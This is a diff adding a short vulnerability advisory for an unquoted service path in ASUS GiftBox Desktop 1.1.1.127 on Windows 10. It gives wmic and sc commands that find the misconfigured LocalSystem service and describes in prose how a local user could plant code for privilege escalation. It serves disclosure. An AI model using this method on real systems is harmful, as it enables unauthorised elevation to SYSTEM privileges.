@@ -1,0 +1,36 @@
+# Exploit Title: ASUS GiftBox Desktop 1.1.1.127 - 'ASUSGiftBoxDesktop' Unquoted Service Path
+# Discovery by: Oscar Flores
+# Discovery Date: 2020-03-05
+# Vendor Homepage: https://www.asus.com/
+# Software Link : https://www.microsoft.com/en-us/p/asus-giftbox/9wzdncrdrb6s?activetab=pivot:overviewtab 
+# Tested Version: 1.1.1.127
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Windows 10 Home Single Language
+
+# Step to discover Unquoted Service Path: 
+
+C:\>wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr "ASUSGift" | findstr /i /v """
+
+Asus GiftBox Desktop	ASUSGiftBoxDekstop	C:\Program Files (x86)\ASUS\ASUS GIFTBOX Desktop\ASUSGIFTBOXDesktop.exe		Auto 
+
+# Service info:
+
+C:\>sc qc ASUSGiftBoxDekstop
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: ASUSGiftBoxDekstop
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\ASUS\ASUS GIFTBOX Desktop\ASUSGIFTBOXDesktop.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Asus GiftBox Desktop
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+#Exploit:
+# A successful attempt would require the local user to be able to insert their code in the 
+# system root path undetected by the OS or other security applications where it could 
+# potentially be executed during application startup or reboot. If successful, the local 
+# user's code would execute with the elevated privileges of the application.
